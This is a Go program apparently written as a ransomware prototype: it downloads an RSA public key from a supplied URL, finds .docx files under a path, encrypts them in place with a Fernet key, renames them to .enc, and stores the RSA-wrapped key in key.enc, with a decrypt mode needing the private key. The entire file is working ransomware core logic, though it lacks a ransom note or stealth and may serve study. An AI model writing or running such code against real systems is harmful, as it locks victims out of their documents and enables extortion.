package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/pem"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	_ "net/http/pprof"
	"os"
	"path/filepath"
	"runtime/pprof"

	"github.com/fernet/fernet-go"
)

type Encrypter struct {
	Key              fernet.Key
	files            []string
	target_extension []string
	rsa_PublicKey    []byte
}

// gen_symmetric_key generates a new symmetric key for encryption and sets the target file extension.
// It initializes the Key field with a new fernet key and sets the target_extension to ".docx".
func (encrypter *Encrypter) gen_symmetric_key() {
	encrypter.Key.Generate()
	encrypter.target_extension = []string{".docx"}
}

// get_public_key fetches the public key from the specified URL and stores it in the rsa_PublicKey field.
func (encrypter *Encrypter) get_public_key(url string) error {

	resp, err := http.Get(url)
	if err != nil {
		return err
	}

	defer resp.Body.Close()

	encrypter.rsa_PublicKey, err = io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("error reading public key from URL: %v", err)
	}

	return nil
}

// search_files walks through the specified path and searches for files with the target file extension.
// It appends the found file paths to the files slice and prints the file paths.
func (encrypter *Encrypter) search_files(path string) {
	err := filepath.Walk(path, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			ext := filepath.Ext(path)
			for _, target_ext := range encrypter.target_extension {
				if ext == target_ext {
					encrypter.files = append(encrypter.files, path)
					fmt.Println("It's a file:", path)
				}
			}
		}
		return nil
	})
	if err != nil {
		fmt.Println("Walk error:", err)
	}
}

// encrypt_files encrypts each file in the files slice using the symmetric key and renames the encrypted file with a ".enc" extension.
func (encrypter Encrypter) encrypt_files() error {
	for _, filepath := range encrypter.files {
		fmt.Println("Encrypting file:", filepath)
		file, err := os.Open(filepath)
		if err != nil {
			return err
		}

		data, err := io.ReadAll(file)
		if err != nil {
			return err
		}

		ciphertext, err := fernet.EncryptAndSign(data, &encrypter.Key)
		if err != nil {
			return err
		}

		err = os.WriteFile(filepath, ciphertext, 0644)
		if err != nil {
			return err
		}
		file.Close()

		err = os.Rename(filepath, filepath+".enc")
		if err != nil {
			return fmt.Errorf("failed to rename %s: %v", filepath, err)
		}
		fmt.Println("Encrypted file:", filepath)
	}
	return nil
}

// save_key encrypts the symmetric key using the RSA public key and saves it to a file at the specified path.
// It uses OAEP padding with SHA-256 as the hash function.
// The encrypted key is written to the specified file path.
func (encrypter Encrypter) save_key(path string) error {
	pem_key := string(encrypter.rsa_PublicKey)
	spkiBlock, _ := pem.Decode([]byte(pem_key))
	pubInterface, _ := x509.ParsePKIXPublicKey(spkiBlock.Bytes)

	rsa_PublicKey := pubInterface.(*rsa.PublicKey)
	oaepLabel := []byte("")
	oaepDigests := sha256.New()
	outf, err := os.Create(path)
	if err != nil {
		return fmt.Errorf("error creating key file: %v", err)
	}
	defer outf.Close()

	ciphertext, err := rsa.EncryptOAEP(oaepDigests, rand.Reader, rsa_PublicKey, encrypter.Key[:], oaepLabel)
	if err != nil {
		return fmt.Errorf("error encrypting symmetric key: %v", err)
	}
	_, err = outf.Write(ciphertext)
	if err != nil {
		return err
	}
	return nil
}

type Decrypter struct {
	Key         fernet.Key
	files       []string
	private_key *rsa.PrivateKey
}

// load_private_key loads the RSA private key from a PEM file at the specified path.
// It reads the file, decodes the PEM block, and parses the private key.
func (decrypter *Decrypter) load_private_key(path string) error {
	file, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	block, _ := pem.Decode(file)
	if block == nil || block.Type != "RSA PRIVATE KEY" {
		return fmt.Errorf("failed to decode PEM block containing the private key")
	}
	privateKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return fmt.Errorf("failed to parse private key: %v", err)
	}
	decrypter.private_key = privateKey
	return nil
}

// get_symmetric_key reads the encrypted symmetric key from a file named "key.enc",
// decrypts it using the RSA private key, and sets the Key field with the decrypted symmetric key.
func (decrypter *Decrypter) get_symmetric_key() error {
	file, err := os.ReadFile("key.enc")
	if err != nil {
		return fmt.Errorf("error reading key file: %v", err)
	}
	oaepLabel := []byte("")
	oaepDigests := sha256.New()
	ciphertext := file
	decryptedKey, err := rsa.DecryptOAEP(oaepDigests, rand.Reader, decrypter.private_key, ciphertext, oaepLabel)
	if err != nil {
		return fmt.Errorf("error decrypting symmetric key: %v", err)
	}
	decrypter.Key = fernet.Key(decryptedKey)
	//fmt.Println("Symmetric key retrieved:", decrypter.Key)
	return nil
}

// decrypt_files walks through the specified path and searches for files with a ".enc" extension.
// It decrypts each found file using the symmetric key and renames the decrypted file by removing the ".enc" extension.
func (decrypter *Decrypter) decrypt_files(path string) error {
	err := filepath.Walk(path, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() && filepath.Ext(path) == ".enc" {
			decrypter.files = append(decrypter.files, path)
			//		fmt.Println("Found encrypted file:", path)
		}
		return nil
	})
	if err != nil {
		return fmt.Errorf("error walking the path %v: %v", path, err)
	}

	for _, filepath := range decrypter.files {
		//	fmt.Println("Decrypting file:", filepath)
		data, err := os.ReadFile(filepath)
		if err != nil {
			return fmt.Errorf("error reading file %s: %v", filepath, err)
		}

		decryptedData := fernet.VerifyAndDecrypt(data, 0, []*fernet.Key{&decrypter.Key})
		if decryptedData == nil {
			return fmt.Errorf("error decrypting file %s: decryption failed or token expired", filepath)
		}

		err = os.WriteFile(filepath, decryptedData, 0644) // Remove .enc extension
		if err != nil {
			return fmt.Errorf("error writing decrypted file %s: %v", filepath[:len(filepath)-4], err)
		}
		err = os.Rename(filepath, filepath[:len(filepath)-4])
		if err != nil {
			return fmt.Errorf("failed to rename %s: %v", filepath, err)
		}
		//	fmt.Println("Decrypted file:", filepath[:len(filepath)-4])
	}
	return nil
}

func main() {

	var mode string
	var path string
	var url string
	var private_key_path string
	flag.StringVar(&private_key_path, "private_key", "Fail", "Path to the private key file")
	flag.StringVar(&mode, "mode", "Fail", "Mode of operation: 'encrypt' or 'decrypt'")
	flag.StringVar(&path, "path", "Fail", "Path to search for files")
	flag.StringVar(&url, "url", "Fail", "URL to fetch the public key")

	flag.Parse()

	// Enable CPU profiling
	f, err := os.Create("./cpu.prof")
	if err != nil {
		log.Fatal("could not create CPU profile file: ", err)
	}
	if err = pprof.StartCPUProfile(f); err != nil {
		log.Fatal("could not start CPU profile: ", err)
	}

	switch mode {
	case "encrypt":
		if url == "Fail" {
			fmt.Println("URL for public key is required in encrypt mode.")
			return
		}
		if path == "Fail" {
			fmt.Println("Path to search for files is required in encrypt mode.")
			return
		}
		Encrypter := Encrypter{}
		Encrypter.gen_symmetric_key()
		err := Encrypter.get_public_key(url)
		if err != nil {
			fmt.Println("Error getting public key:", err)
			return
		}
		Encrypter.search_files(path)
		err = Encrypter.encrypt_files()
		if err != nil {
			fmt.Println("Error encrypting files:", err)
			return
		}
		err = Encrypter.save_key("key.enc")
		if err != nil {
			fmt.Println("Error saving symmetric key:", err)
			return
		}
	case "decrypt":
		if private_key_path == "Fail" {
			fmt.Println("private_key to the private key is required in decrypt mode.")
			return
		}
		if path == "Fail" {
			fmt.Println("Path to search for files is required in decrypt mode.")
			return
		}
		Decrypter := Decrypter{}
		err := Decrypter.load_private_key(private_key_path)
		if err != nil {
			fmt.Println("Error loading private key:", err)
			return
		}
		err = Decrypter.get_symmetric_key()
		if err != nil {
			fmt.Println("Error getting symmetric key:", err)
			return
		}
		err = Decrypter.decrypt_files(path)
		if err != nil {
			fmt.Println("Error decrypting files:", err)
			return
		}
	default:
		fmt.Println("Unknown mode. Use 'encrypt' or 'decrypt'.")
	}
	pprof.StopCPUProfile()
	f.Close()
	log.Println("Application running...")
}
